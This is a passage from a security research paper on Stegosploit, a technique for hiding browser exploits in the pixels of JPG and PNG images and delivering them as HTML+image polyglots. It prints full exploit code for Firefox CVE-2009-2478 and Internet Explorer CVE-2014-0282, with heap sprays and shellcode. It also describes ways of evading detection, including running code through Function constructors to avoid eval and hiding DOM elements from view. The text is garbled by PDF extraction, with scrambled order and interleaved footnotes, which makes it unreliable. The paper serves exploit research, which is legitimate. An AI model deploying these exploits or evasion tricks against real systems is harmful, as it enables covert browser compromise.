Borrowing from the CANVAS PNG decoder,
I demonstrated an exploit for the Mozilla Firefox
3.5 Font Tags Remote Buffer Overflow (CVE-2009-
2478) 26 vulnerability delivered via a grayscale PNG
image for the first time at Hack.LU 2010 in my talk,
“Exploit Delivery—Tricks and Techniques” 27 . The
The Stegosploit Toolkit v0.2, released along with
this paper, contains the tools necessary to test
image-based exploit delivery. A case study of a Use-
After-Free exploit (CVE-2014-0282) is presented
with this paper demonstrating the Stegosploit tech-
nique.
7.1
Introduction
The probability of an exploit succeeding in compro-
mising its target depends largely upon three factors.
Obviously, (1) the target software must be vulner-
able, but also the exploit code must not be (2) de-
tected and neutralized in transit or (3) detected and
neutralized at the destination.
As malware and intrusion detection systems im-
prove their success ratio, stealthy exploit delivery
techniques become increasingly vital in an exploit’s
success. Simply exploiting an 0-day vulnerability is
no longer enough.
This article is focused on browser exploits. Most
23 http://utf-8.jp/public/jjencode.html
24 http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/external/ExternalInterface.html
25 http://ajaxian.com/archives/want-to-pack-js-and-css-really-well-convert-it-to-a-png-and-unpack-it-via-canvas
26 https://www.exploit-db.com/exploits/9137/
27 http://www.slideshare.net/saumilshah/exploit-delivery
271 f u n c t i o n packv ( b ) { v a r a=new Number ( b ) . t o S t r i n g ( 1 6 ) ; while ( a . l e n g t h <8){ a=" 0 "+a } r e
t u r n ( u n e s c a p e ( "%u"+a . s u b s t r i n g ( 4 , 8 )+"%u"+a . s u b s t r i n g ( 0 , 4 ) ) ) } v a r c o n t e n t=" " ; c o n t
3 e n t+="<p><FONT>xxxxxxxxxxxxxxxxxxxxxxxxxxxxx </FONT></p>" ; c o n t e n t+="<p><FONT>A
BCD</FONT></p>" ; c o n t e n t+="<p><FONT>EFGH</FONT></p>" ; c o n t e n t+="<p><FONT>Aaaaa </
5 FONT></p>" ; v a r c o n t e n t O b j e c t=document . getElementById ( " c o n t e n t " ) ; c o n t e n t O b j e c t . s
t y l e . v i s i b i l i t y =" hid d en " ; c o n t e n t O b j e c t . innerHTML=c o n t e n t ; v a r s h e l l c o d e=" " ; s h e l l
7 code+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0
6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2
9 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 5 ) ; s h e l l c o d e+
=packv ( 2 0 8 3 8 1 8 2 4 5 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; sh
11 e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0
2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 2 3 0 6 ) ; s h e l l c o d e+=pack
13 v ( 2 0 8 3 8 0 2 3 0 5 ) ; s h e l l c o d e+=packv ( 2 0 8 4 0 2 0 5 4 4 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 6 0 7 1 4 ) ; s h e l l c o
de+=packv ( 2 0 8 3 7 9 0 8 2 0 ) ; s h e l l c o d e+=packv ( 5 3 8 9 6 8 0 6 4 ) ; s h e l l c o d e+=packv ( 1 6 3 8 4 ) ; s h e l l
15 code+=packv ( 6 4 ) ; s h e l l c o d e+=packv ( 5 3 8 9 6 8 0 6 4 ) ; s h e l l c o d e+=packv ( 2 0 8 3 8 0 6 2 5 6 ) ; s h e l l c
ode+=u n e s c a p e ( "%u e 8 f c%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b
17 14%u2872%u b 7 0 f%u264a%u f f 3 1%uc031%u3cac%u7c61%u2c02%uc120%u 0 d c f%uc701%u f 0 e 2%u575
2%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301
19 %u3ce3%u8b49%u8b34%ud601%u f f 3 1%uc031%uc1ac%u 0 d c f%uc701%ue038%u f 4 7 5%u7d03%u 3 b f 8%
u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u
21 2424%u5b5b%u5961%u515a%u e 0 f f%u 5 f 5 8%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6
850%u8b31%u 8 7 6 f%u d 5 f f%uf0bb%ua2b5%u6856%u95a6%u9dbd%u d 5 f f%u063c%u0a7c%u f b 8 0%u75
23 e0%ubb05%u1347%u 6 f 7 2%u006a%u f f 5 3%u63d5%u6c61%u2e63%u7865%u0065 " ) ; while ( ( s h e l l c o
de . l e n g t h %4) !=0) { s h e l l c o d e+=u n e s c a p e ( "%u9090 " ) } v a r v t a b l e s=" " ; f o r ( i =0; v t a b l e s . l
25 ength <128; i ++){ v t a b l e s+=packv ( 2 1 0 5 3 4 4 ) } v a r padding=packv ( 2 4 2 5 3 9 3 2 9 6 ) ; v a r i t e m s=
1 0 0 0 ; v a r n o p s l e d _ s i z e =1048576; v a r chunk_size =4096; v a r mem=new Array ( ) ; v a r chunk
27 1=padding ; while ( chunk1 . l e n g t h <=chunk_size ) { chunk1+=chunk1 } chunk1=s h e l l c o d e+chun
k1 ; chunk1=chunk1 . s u b s t r i n g ( 0 , chunk_size ) ; v a r chunk2=chunk1 ; while ( chunk2 . l e n g t h <
29 =n o p s l e d _ s i z e / 2 ) { chunk2+=chunk1 } chunk2=chunk2 . s u b s t r i n g ( 0 , n o p s l e d _ s i z e / 2 ) ; v a r c
hunk3=padding ; while ( chunk3 . l e n g t h <=chunk_size ) { chunk3+=chunk3 } chunk3=v t a b l e s+ch
31 unk3 ; chunk3=chunk3 . s u b s t r i n g ( 0 , chunk_size ) ; v a r chunk4=chunk3 ; while ( chunk4 . l e n g t
h<=n o p s l e d _ s i z e / 2 ) { chunk4+=chunk3 } chunk4=chunk4 . s u b s t r i n g ( 0 , n o p s l e d _ s i z e / 2 ) ; f o r
33 ( i =0; i <i t e m s ; i ++){ i d=" "+( i %10) ; i f ( i <( i t e m s / 2 ) ) {mem[ i ]= chunk2 . s u b s t r i n g ( 0 , n o p s l e
d _ s i z e /2−1−1)+i d } e l s e {mem[ i ]= chunk4 . s u b s t r i n g ( 0 , n o p s l e d _ s i z e /2−1−1)+i d }} v a r cou
35 nt =0; f o r ( i =0; i <i t e m s ; i ++){ count+=mem[ i ] . l e n g t h } document . t i t l e =count ; v a r searchA
r r a y=new Array ( ) ; f u n c t i o n e s c a p e D a t a ( d ) { v a r b ; v a r e ; v a r a=" " ; f o r ( b=0;b<d . l e n g t h
37 ; b++){ e=d . charAt ( b ) ; i f ( e=="&" | | e==" ? " | | e=="=" | | e=="%" | | e==" " ) { e=e s c a p e ( e ) } a+=e
} return ( a ) } f u n c t i o n D a t a T r a n s l a t o r ( ) { s e a r c h A r r a y=new Array ( ) ; s e a r c h A r r a y [ 0 ] = new
39 Array ( ) ; s e a r c h A r r a y [ 0 ] [ " s t r " ]= " b l a h " ; v a r b=document . getElementById ( " c o n t e n t " ) ;
i f ( document . getElementsByTagName ) { v a r a =0; pTags=b . getElementsByTagName ( "p" ) ; i f (
41 pTags . l e n g t h >0){ while ( a<pTags . l e n g t h ) { oTags=pTags [ a ] . getElementsByTagName ( " f o n t
" ) ; s e a r c h A r r a y [ a+1]=new Array ( ) ; i f ( oTags [ 0 ] ) { s e a r c h A r r a y [ a + 1 ] [ " s t r " ]= oTags [ 0 ] . i
43 nnerHTML} a++}}}} f u n c t i o n GenerateHTML ( ) { v a r a=" " ; f o r ( i =1; i <s e a r c h A r r a y . l e n g t h ; i
++){ a+=e s c a p e D a t a ( s e a r c h A r r a y [ i ] [ " s t r " ] ) }} f u n c t i o n blowup ( ) { D a t a T r a n s l a t o r ( ) ; Ge
45 nerateHTML ( ) } blowup ( ) ;
Figure 11: Firefox 3.5 Font Tags Buffer Overflow Exploit for CVE-2009-2478
28Section 7.2 introduces CVE-2014-0282, provides
a quick tour of the Stegosploit Toolkit, and explains
the process of steganographically encoding the ex-
ploit code into JPG and PNG images.
Section 7.3 deals with decoding the encoded im-
age using Javascript in the victim’s browser.
Section 7.4 introduces HTML+Image polyglots,
necessary for packing the decoder and steganograph-
ically encoded exploit into a single container.
Section 7.5 talks about some of the finer points of
HTTP transport when it comes to exploit delivery.
code for this exploit is shown in Figure 11, while
the same exploit can be compressed into the follow-
ing PNG image.
7.2
CVE-2014-0282 Case Study
Stegosploit is a portmanteau of Steganography and
Exploit. Using Stegosploit, it is possible to trans-
form virtually any Javascript-based browser exploit
into a JPG or PNG image.
We shall start with a minified Javascript version
of the exploit code, tested on Internet Explorer 9
running on Windows 7 SP1. Exploit code for CVE-
2014-0282 is shown in Figure 12.
The exploit performs a heap spray using HTML5
CANVAS-based on a technique first discussed at
EUSecWest 2012 by Federico Muttis and Anibal
Sacco, 31 and code borrowed from Peter Hlavaty’s
HTML5 Heap Spray code h5spray. 32
The exploit sprays a simple VirtualProtect ROP
chain and Windows command execution shellcode
to launch calc.exe upon successfully triggering the
IE CInput Use-After-Free vulnerability. 33
To deliver this exploit in style, and also for vari-
ous practical reasons, let’s obey five restrictions. (1)
No data to be transmitted over the network except
JPG or PNG files. (2) The image displayed in the
browser should have no visible aberration or dis-
tortion. (3) No exploit code should be present as
strings within the image file. (4) The image should
decode the exploit code upon being loaded in the
browser without any external user interaction. (5)
Only ONE image shall be used for this exploit.
We shall begin with a JPG image of Kevin Mc-
Peake, who volunteered to have this exploit painted
on his face for a demonstration at Hack In The Box
Amsterdam 2015.
In 2014, Sucuri reported a browser exploit cam-
paign that used the now dubbed “255 shades of gray”
exploit delivery technique employing the same CAN-
VAS PNG decoder Javascript that I had demon-
strated in 2010. 28
Since 2010, I have been working on several tech-
niques for sophisticated exploit delivery using im-
ages. The results of my research have led to the
Stegosploit toolset, which I shall use to demonstrate
delivering and triggering an exploit for the Inter-
net Explorer CInput Use-After-Free vulnerability
(CVE-2014-0228) using a single image. 29
My motivation for image-based exploit delivery
is simple. I want to study the effectiveness of image-
based exploit delivery, explore ramifications on ex-
ploit detection, and evolve new mitigation tech-
niques to combat future threats. However, my main
motivation still remains delivering exploits in style,
and combining them with my photography! 30
What follows is a detailed discussion on creating
and delivering steganographically encoded exploits
using nothing but a single image. We shall take a
known Internet Explorer Use-After-Free vulnerabil-
ity (CVE-2014-0282), which is currently delivered
using HTML and Javascript, and turn it into an ex-
ploit that can be delivered via a single image.
28 https://blog.sucuri.net/2014/02/new-iframe-injections-leverage-png-image-metadata.html
29 https://www.exploit-db.com/exploits/33860/
30 http://www.spectral-lines.in/
31 http://www.coresecurity.com/corelabs-research/publications/html5-heap-sprays-pwn-all-things
32 http://www.zer0mem.sk/?p=5
33 https://www.exploit-db.com/exploits/33860/
291 f u n c t i o n H5 ( ) { t h i s . d = [ ] ; t h i s .m=new Array ( ) ; t h i s . f=new Array ( ) }H5 . p r o t o t y p e . f l a t
t e n=f u n c t i o n ( ) { f o r ( v a r f =0; f <t h i s . d . l e n g t h ; f ++){ v a r n=t h i s . d [ f ] ; i f ( t y p e o f ( n )== '
3 number ' ) { v a r c=n . t o S t r i n g ( 1 6 ) ; while ( c . l e n g t h <8){ c= ' 0 '+c } v a r l=f u n c t i o n ( a ) { r e t u r
n ( p a r s e I n t ( c . s u b s t r ( a , 2 ) , 1 6 ) ) } ; v a r g=l ( 6 ) , h=l ( 4 ) , k=l ( 2 ) ,m=l ( 0 ) ; t h i s . f . push ( g ) ; t
5 h i s . f . push ( h ) ; t h i s . f . push ( k ) ; t h i s . f . push (m) } i f ( t y p e o f ( n )== ' s t r i n g ' ) { f o r ( v a r d=0
; d<n . l e n g t h ; d++){ t h i s . f . push ( n . charCodeAt ( d ) ) } } } } ; H5 . p r o t o t y p e . f i l l =f u n c t i o n ( a )
7 { f o r ( v a r c =0 ,b=0; c<a . data . l e n g t h ; c++,b++){ i f ( b>=8192){b=0}a . data [ c ]=( b<t h i s . f . l
ength ) ? t h i s . f [ b ] : 2 5 5 } } ; H5 . p r o t o t y p e . s p r a y=f u n c t i o n ( d ) { t h i s . f l a t t e n ( ) ; f o r ( v a r b=
9 0 ; b<d ; b++){ v a r c=document . c r e a t e E l e m e n t ( ' c a n v a s ' ) ; c . width =131072; c . h e i g h t =1; v a r
a=c . g e t C o n t e x t ( ' 2d ' ) . c r e a t e I m a g e D a t a ( c . width , c . h e i g h t ) ; t h i s . f i l l ( a ) ; t h i s .m[ b]=
11 a } } ; H5 . p r o t o t y p e . s e t D a t a=f u n c t i o n ( a ) { t h i s . d=a } ; v a r f l a g=f a l s e ; v a r heap=new H5 ( )
; t r y { l o c a t i o n . h r e f= ' ms−h e l p : ' } c a t c h ( e ) {} f u n c t i o n s p r a y ( ) { v a r a= ' \ x f c \ xe8 \ x89 \ x0
13 0\ x00 \ x00 \ x60 \ x89 \ xe5 \ x31 \ xd2 \ x64 \ x8b \ x52 \ x30 \ x8b \ x52 \ x0c \ x8b \ x52 \ x14 \ x8b \ x72 \x
28\ x 0 f \ xb7 \ x4a \ x26 \ x31 \ x f f \ x31 \ xc0 \ xac \ x3c \ x61 \ x7c \ x02 \ x2c \ x20 \ xc1 \ x c f \ x0d \ x01 \
15 xc7 \ xe2 \ x f 0 \ x52 \ x57 \ x8b \ x52 \ x10 \ x8b \ x42 \ x3c \ x01 \ xd0 \ x8b \ x40 \ x78 \ x85 \ xc0 \ x74 \ x4a
\ x01 \ xd0 \ x50 \ x8b \ x48 \ x18 \ x8b \ x58 \ x20 \ x01 \ xd3 \ xe3 \ x3c \ x49 \ x8b \ x34 \ x8b \ x01 \ xd6 \ x3
17 1\ x f f \ x31 \ xc0 \ xac \ xc1 \ x c f \ x0d \ x01 \ xc7 \ x38 \ xe0 \ x75 \ x f 4 \ x03 \ x7d \ x f 8 \ x3b \ x7d \ x24 \x
75\ xe2 \ x58 \ x8b \ x58 \ x24 \ x01 \ xd3 \ x66 \ x8b \ x0c \ x4b \ x8b \ x58 \ x1c \ x01 \ xd3 \ x8b \ x04 \ x8b \
19 x01 \ xd0 \ x89 \ x44 \ x24 \ x24 \ x5b \ x5b \ x61 \ x59 \ x5a \ x51 \ x f f \ xe0 \ x58 \ x 5 f \ x5a \ x8b \ x12 \ xeb
\ x86 \ x5d \ x6a \ x01 \ x8d \ x85 \ xb9 \ x00 \ x00 \ x00 \ x50 \ x68 \ x31 \ x8b \ x 6 f \ x87 \ x f f \ xd5 \xbb\ x f
21 0\ xb5 \ xa2 \ x56 \ x68 \ xa6 \ x95 \xbd\ x9d \ x f f \ xd5 \ x3c \ x06 \ x7c \ x0a \ x80 \ x f b \ xe0 \ x75 \ x05 \x
bb\ x47 \ x13 \ x72 \ x 6 f \ x6a \ x00 \ x53 \ x f f \ xd5 \ x63 \ x61 \ x6c \ x63 \ x2e \ x65 \ x78 \ x65 \ x00 ' ; v a r
23 c = [ ] ; f o r ( v a r b=0;b <1104; b+=4){ c . push ( 1 3 7 1 7 5 6 6 2 8 ) } c . push ( 1 3 7 1 7 5 6 6 2 7 ) ; c . push ( 1 3 7
1351263) ; var f =[1371756626 ,215 ,2147353344 ,1371367674 ,202122408 ,4294967295 ,20212
25 2 4 0 0 , 2 0 2 1 2 2 4 0 4 , 6 4 , 2 0 2 1 1 6 1 0 8 , 2 0 2 1 2 1 2 4 8 , 1 6 3 8 4 ] ; v a r d=c . c o n c a t ( f ) ; d . push ( a ) ; heap . s
etData ( d ) ; heap . s p r a y ( 2 5 6 ) } f u n c t i o n c h a n g e r ( ) { v a r c=new Array ( ) ; f o r ( v a r a =0; a<10
27 0 ; a++){ c . push ( document . c r e a t e E l e m e n t ( ' img ' ) ) } i f ( f l a g ) { document . getElementById ( '
fm ' ) . innerHTML= ' ' ; C o l l e c t G a r b a g e ( ) ; v a r b= ' \ u2020 \ u0c0c ' ; f o r ( v a r a =4; a <110; a+=2)
29 {b+= ' \ u4242 ' } f o r ( v a r a =0; a<c . l e n g t h ; a++){ c [ a ] . t i t l e =b }}} f u n c t i o n run ( ) { s p r a y ( ) ;
document . getElementById ( ' c2 ' ) . c h e c k e d=t r u e ; document . getElementById ( ' c2 ' ) . onprop
31 e r t y c h a n g e=c h a n g e r ; f l a g=t r u e ; document . getElementById ( ' fm ' ) . r e s e t ( ) } s e t T i m e o u t ( r
un , 1 0 0 0 ) ;
Figure 12: Exploit for CVE-2014-0282, to be decoded by Figure 13.
307.2.1
Encoding the Exploit Code
Steganography is a well established science. There
are several steganography algorithms that not only
avoid visual detection but also provide error correc-
tion and the ability to survive basic image transfor-
mation. Popular algorithms such as F5 34 have been
implemented in Javascript. 35 However, we will use
very basic steganography to keep the decoder code
compact and simple.
An image is essentially an array of pixels. Each
pixel can have three channels: Red, Green, and
Blue. Each channel is represented by an 8-bit value,
which provides 256 discrete levels of color. Some
images also have a fourth channel, called the alpha
channel, which is used for pixel transparency. We
shall restrict ourselves to using only the R, G, and
B channels. A black and white image uses the same
values for R, G, and B channels for each pixel.
Note that the images are equalized to show the
presence and absence of pixel bits. Bit layer 7 con-
tributes the maximum information to the image. It
is akin to the broad outlines of a painting. As we
step down through the bit layers, the information
contributed to the image decreases, but the level of
detail increases. Bit layer 0 in isolation looks like
noise and contributes to the finer shade variations
in the overall image.
Let us, for simplicity’s sake, consider black and
white images to start with. Keeping in mind 8-bit
grayscale values, we can visualize an image to be
composed of 8 separate bit layers. Bit layer 0 is an
image formed by values of the least significant bit
(LSB) of the pixels. Bit layer 1 is formed by values
of the second least significant pixel bit. Bit layer 7 is
formed by values of the most significant bit (MSB)
of all the pixels.
Think of the bit layers as transparent sheets.
When they are superimposed together, they will re-
sult in the complete image. The exploit code shall
be written on one of these transparent sheets. First,
the exploit code is converted to a bit stream. Each
bit from the exploit bit stream is written onto the
bit in the image’s bit layer. The bit layers are then
superimposed together to create an image, one that
contains the exploit code encoded in its pixels. En-
coding the exploit bit stream on higher bit layers
will result in significant visual distortion of the re-
sultant image. The goal is to encode the exploit bit
stream into lower bit layers, preferably bit layer 0
which comprises of the LSB of all the pixels.
Kevin’s image can be decomposed into 8-bit lay-
ers as shown in the following images.
For comparison, here are two resultant images,
with the exploit bit stream encoded on bit layer 7
versus bit layer 2. The pixel encoding is exagger-
ated using red pixels for 1’s and black pixels for 0’s
encoded in a 3 × 3 grid.
34 http://f5-steganography.googlecode.com/files/F5%20Steganography.pdf
35 https://github.com/desudesutalk/js-jpeg-steg
31less compression. Certain pixels will still be approx-
imated no matter what, even if we use the highest
possible encoding quality level. To further minimize
pixel approximation, we shall not encode the ex-
ploit bit stream on consecutive pixels, but rather in
a pixel grid with every nth pixel in rows and columns
being used for encoding the bit stream. Pixel grids
of 3 × 3 and 4 × 4 perform much better compared to
encoding on every consecutive pixel. Increased pixel
grid dimensions do not make for lower errors.
The encoding process can be represented as fol-
lows.
• Let I be the source image.
• Let M be the message to be encoded on a given
bit layer of image I.
• Let EN CODE be the steganographic encoder
function, and let DECODE be the stegano-
graphic decoder function.
• Let b be the number of the bit layer (0–7).
• Let J be the JPG encoder function.
By encoding message M onto image I, we shall
obtain resultant image I 0 , as follows:
I 0 = J(EN CODE(I, M, b))
The resultant image, when the bitstream is en-
coded on bit layer 2, shows little or no visual aber-
ration, even close up.
JPG images are compressed using a discrete co-
sine transform (DCT) based lossy compression algo-
rithm. A pixel may be approximated to its nearest
neighbor for better compression at the cost of image
entropy and detail. The resultant visual degradation
would be negligible, but the loss of pixel data intro-
duces significant errors in steganographic message
recovery. To overcome pixel loss of JPG encoding,
we shall use an iterative encoding technique, which
shall result in an error-free decoding of the encoded
bit stream.
“Exploring JPEG” is an aptly named article that
provides detailed explanation of how JPG files com-
press image data. 36
Upon decoding image I 0 , we shall obtain a resul-
tant message M 0 , as follows:
M 0 = DECODE(I 0 , b)
For JPG images, M 0 is not equal to M . Let ∆
be the error between the original and resultant mes-
sage.
∆ = M − M 0
Our goal is to get ∆ = 0. If we re-encode the
original message M on resultant image I 0 , we shall
obtain a new image I 00 :
I 00 = J(EN CODE(I 0 , M, b))
Decoding I 00 will result in message M 00 as follows:
7.2.2
Iterative Encoding for JPG Images
M 00 = DECODE(I 00 , b)
JPG encoders can use variable quality settings. Low
quality offers maximum compression. However, the
maximum quality level does not provide us with loss-
∆ 0 = M − M 00
36 https://www.imperialviolet.org/binary/jpeg/
32If ∆ 0 < ∆, then we can assume that the encod-
ing process shall converge, and after N iterations, we
will get an error-free decoded message and ∆ = 0.
Note: since the encoding and decoding processes
operate on discrete pixels, certain situations result
in non-convergence with neighboring pixels flipping
alternately like Conway’s Game of Life.The number
of passes required for convergence depends upon the
encoder used in the JPG processor library.
Stegosploit’s iterative encoder tool iterative_-
encoder.html uses the browser’s built in JPG pro-
cessor library via HTML5 CANVAS. All stegano-
graphic encoding is performed in-browser using
CANVAS. Browsers use different JPG processor
libraries.
A steganographically generated JPG
from Firefox will not accurately decode in Inter-
net Explorer, and vice versa. A future goal is
to achieve cross-browser JPG steganography com-
patibility. For now, PNG provides cross-browser
steganography compatibility because it employs
lossless compression. Therefore, for CVE-2014-
0282, we shall use IE9 to perform the steganographic
encoding.
7.2.3
A Few Notes on Encoding on JPG us-
ing CANVAS
All Stegosploit tools use HTML5 CANVAS for im-
age analysis, encoding, and decoding. Here are some
of the finer points to be kept in mind for using or
extending the tools.
Note: These observations are based on encoding
that involved messages averaging 2500 bytes in size,
the average size of a typical minified and compacted
browser exploit.
iterative_encoding.html generates JPG
images using the toDataURL("image/jpeg",
quality). The quality parameter is a value be-
tween 0 and 1. As mentioned earlier, a value of
1 does not imply lossless encoding. By default,
iterative_encoding.html keeps the quality value
as 1. Reducing the quality value increases the pixel
deviation with each encoding round, prolonging
the convergence, and in some cases not leading to
convergence at all. The quality of encoding also de-
pends upon whether the encoder uses software-only
encoding or hardware assisted encoding. Float-
ing point precision, make and model of GPU, and
JPG libraries across different platforms contribute
to minor errors when encoding and decoding across
37 Stack
text?”
browsers.
I have found that encoding at bit layer 0 and 1
usually never results into convergence when it comes
to JPG. My tests were performed with IE9 and Fire-
fox 21. Bit layers 2 and 3 have shown more success
when it comes to encoding, especially on IE. Bit
layer 5 and above result in noticeable visual aberra-
tion of the encoded image.
A pixel grid of 3 × 3 is preferred for the encod-
ing process. This implies 1 bit for every 9 pixels in
the image. Higher pixel grids yield faster conver-
gence and less visual degradation. The JPG DCT
algorithm encodes 8 × 8 pixel squares at a time. It
doesn’t make sense to use a pixel grid larger than
8 × 8.
I encountered unusual errors when encoding
larger images. The pixel array of the CANVAS ap-
peared to be truncated beyond a certain dimension.
For example, encoding was successful on 1024x768
pixel images, but completely fell apart on 1280x850
pixel images. While I have not tested the operating
limit in terms of dimensions, a discussion on Stack
Overflow 37 seems to indicate that IE might limit
CANVAS memory to 20MB.
Color images can be thought of as composite im-
ages derived from three channels: Red, Green, and
Blue. Each image can therefore be visualized as be-
ing decomposed into three channels, and each chan-
nel is further decomposed into 8-bit layers. We can
choose to encode on any one of the 24 image layers.
Firefox’s JPG encoder outperforms IE’s JPG en-
coder when it comes to color images. IE’s JPG en-
coder does not usually converge when encoding at
bit layers below 3.
Stegosploit’s encoding process only affects the
pixel data stored with the JPG file. All other meta-
data including EXIF tags do not affect the encod-
ing/decoding process. Encoded images generated
from iterative_encoding.html do not retain any
metadata present in the original image. This is be-
cause toDataURI("image/jpeg") generates entirely
new JPG data. It is possible to copy the original
JPG metadata back onto the encoded image using
EXIF manipulation tools such as exiftool.
2
$ e x i f t o o l −t a g s F r o m F i l e s o u r c e . JPG \
− a l l : a l l encoded . JPG
Certain applications check for validity of images
Overflow, “Strange issue with Canvas in Internet Explorer 9, is there any constraint of width and size of canvas/con-
33using metadata. Metadata adds more “legitimacy”
to the steganographically encoded image.
7.2.4
pre-populating certain elements in the DOM. CVE-
2014-0282 is one such exploit that requires elements
like <form>, <textarea>, <input> to be present in
the DOM before triggering the Use-After-Free via
Javascript.
The HTML code containing the decoder script
and other DOM elements required by CVE-2014-
0282 is shown below in Figure 13.
The HTML code is packed as tightly as possi-
ble. There are several important factors to be noted,
each serving a specific purpose.
If IE9 does not detect the <!DOCTYPE html> dec-
laration at the beginning of the HTML document, it
switches over to Quirks Mode instead of Standards
Mode. Without Standards Mode, canvas does not
work, and our entire decoder process grinds to a
halt.
Fortunately, IE can be switched over to Stan-
dards Mode using the X-UA-Compatible header as
follows: 39
Encoding for PNG images
PNG images store pixel data using lossless compres-
sion. There is no approximation of pixels, and there-
fore there is no loss of quality. HTML5 CANVAS
has the ability to generate PNG images using the
toDataURI("image/png") method.
iterative_encoding.html has the ability to
auto-detect the source image type, based on its ex-
tension, and use the appropriate encoding process.
Encoding on PNG images has several advantages
over JPG:
The encoding process completes in a single pass.
Encoding is possible at the lower layer, as the LSB,
so no visual aberrations occur in the resulting im-
age. Cross-browser decoding works accurately, and
it is possible to encode in the alpha channel! 38
7.3
<head><meta http−e q u i v="X −UA −Compatible "
c o n t e n t=" IE=Edge">
Decoding the Exploit
A steganographically encoded exploit is performed
in roughly the following six steps.
(1) Load the HTML containing the decoder
Javascript in the browser.
(2) The decoder HTML loads the image carrying
the steganographically encoded exploit code.
(3) The decoder Javascript creates a new canvas
element.
(4) Pixel data from the image is loaded into the
canvas, and the parent image is destroyed from the
DOM. From here onwards, the visible image is from
the pixels in the canvas element.
(5) The decoder script reconstructs the exploit
code bitstream from the pixel values in the encoded
bit layer.
(6) The exploit code is reassembled into
Javascript code from the decoded bitstream.
(7) The exploit code is then executed as
Javascript. If the browser is vulnerable, it will be
compromised.
7.3.1
The decoder script in Figure 13 performs the in-
verse function of the encoder. The script requires
three global variables that are hardcoded in the first
line:
bL Bit Layer. It has to match the bit layer used
for encoding the bitstream.
eC Encoding Channel. 0 = Red, 1 = Green, 2 =
Blue, 3 = All Channels (grayscale)
gr Pixel Grid. Here 3 implies a 3x3 pixel grid,
the same grid used in the encoding process.
The script ends by invoking the function exc()
with the reconstructed exploit Javascript string.
The most obvious way of executing Javascript
code represented as a string would be to use the
eval() function. eval(), however, gets flagged as
potentially dangerous code.
Another way of executing Javascript code from
strings is to create a new anonymous Function ob-
ject, with the Javascript string supplied as an ar-
gument to its constructor. The resultant Function
object can then be invoked to the same effect as
eval()ing the string.
Decoder for CVE-2014-0282
By and large the function of decoding the stegano-
graphically encoded exploit remains the same, but
certain browser exploits need some extra support, by
38 Note
that iterative_encoding.html doesn’t support this yet.
39 https://msdn.microsoft.com/en-us/library/jj676915%28v=vs.85%29.aspx
34Javascript contains no potentially offensive content.
Its code simply manipulates canvas pixels and ar-
rays.
The encoded JPG file also carries no offensive
strings. All the exploit code—the shellcode, the
ROP chain, the Use-After-Free trigger—is now em-
bedded as bits in pixels.
Earlier versions of Stegosploit, like the one
demonstrated at SyScan 2015 Singapore used these
two separate components to deliver the exploit.
The current version of Stegosploit—v0.2, demon-
strated at HITB 2015 Amsterdam—combines the de-
coder HTML and the steganographically encoded
image into a single container. 40 If opened in an im-
age viewer, the contents show a perfectly valid JPG
image. If loaded into a browser, the contents ren-
der as an HTML document, invoking the decoder
code and triggering the exploit, while still showing
the image (itself ) in the browser!
This is a polyglot document. For a detailed dis-
cussion on polyglots, please read up the excellent
write-up by Ange Albertini in PoC||GTFO 7:6.
1 f u n c t i o n e x c ( b ) { v a r a=s e t T i m e o u t ( ( new
F u n c t i o n ( b ) ) , 1 0 0 ) }window . o n l o a d=i 0 ;
</ s c r i p t >
Hat tip to Dr. Mario Heiderich for first discover-
ing this technique.
When delivering exploits in style, the rendered
view has to appear neat and clean. Extra DOM el-
ements required for the Use-After-Free bug should
not clutter the display. An extra <style> tag in-
serted into the HTML allows us to selectively display
only the image, and hide everything else by default.
<s t y l e >body { v i s i b i l i t y : h id de n ; } . s {
v i s i b i l i t y : v i s i b l e ; p o s i t i o n : a b s o l u t e ; top
:15p
2 x ; l e f t : 1 0 px ;} </ s t y l e ></head>
The above CSS style sets the contents of body as
hidden. Only elements with style class s will be dis-
played. The following DOM elements required for
the Use-After-Free are all hidden from view:
7.4
<body><form i d=fm><t e x t a r e a i d=c v a l u e=a1></
t e x t a r e a ><i n p u t i d=c2 t y p e=checkbox
2 name=o2 v a l u e=" a2 ">Test check<Br><t e x t a r e a
i d=c3 v a l u e=" a2 "></t e x t a r e a ><i n p u t
t y p e=t e x t name=t1 ></form>
The final product of Stegosploit is a single JPG im-
age that will trigger the CVE-2014-0282 Use-After-
Free vulnerability in IE, when loaded in the browser.
Before we get to the mechanics of HTML+JPG
polyglots, we shall take a look at the origins of
browser-based polyglots.
Only the image is visible, since it is wrapped
within a <div> tag with CSS class s applied to it.
Note the source of the image is set to #, which re-
sults into the current document URL. We shall see
the usefulness of this trick when we discuss polyglot
documents in a later section.
7.4.1
IMAJS - Early Work
I first started exploring browser-based polyglots in
2012, trying to combine data formats that are loaded
and parsed by browsers. The end result was IMAJS,
a successful polyglot of a GIF image and Javascript.
The IMAJS technique could also be applied on BMP
files. I presented IMAJS polyglots in my talk titled
“Deadly Pixels” at NoSuchCon 2013. 41
GIF files always begin with the magic marker
GIF89a. The idea here is to create a valid GIF im-
age that contains Javascript appended at its end.
